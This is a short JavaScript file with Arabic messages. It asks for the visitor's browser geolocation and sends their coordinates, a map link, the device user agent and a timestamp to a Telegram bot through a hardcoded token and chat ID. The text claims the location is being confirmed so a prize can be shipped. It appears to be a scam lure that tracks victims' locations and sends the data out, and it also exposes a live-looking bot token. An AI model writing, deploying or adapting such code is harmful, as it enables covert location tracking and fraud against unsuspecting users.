function sendLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else {
    alert("المتصفح لا يدعم تحديد الموقع");
  }
}

function success(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
  const userAgent = navigator.userAgent;
  const timestamp = new Date().toLocaleString('ar-EG');

  const telegramToken = '7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0';
  const chatId = '6817512459';

  const message = `
تم تأكيد موقع الشحن:
- خط العرض: ${latitude}
- خط الطول: ${longitude}
- الموقع على الخريطة: ${googleMapsLink}
- نوع الجهاز: ${userAgent}
- الوقت والتاريخ: ${timestamp}
  `;

  fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message.trim()
    })
  })
  .then(response => {
    if (response.ok) {
      alert("تم تأكيد الموقع بنجاح، وسيتم شحن الجائزة قريبًا!");
    } else {
      alert("حدث خطأ أثناء إرسال الموقع.");
    }
  })
  .catch(error => {
    alert("فشل الاتصال بالخادم.");
    console.error(error);
  });
}

function error(err) {
  alert("لم نتمكن من تحديد موقعك. يرجى المحاولة مرة أخرى.");
}
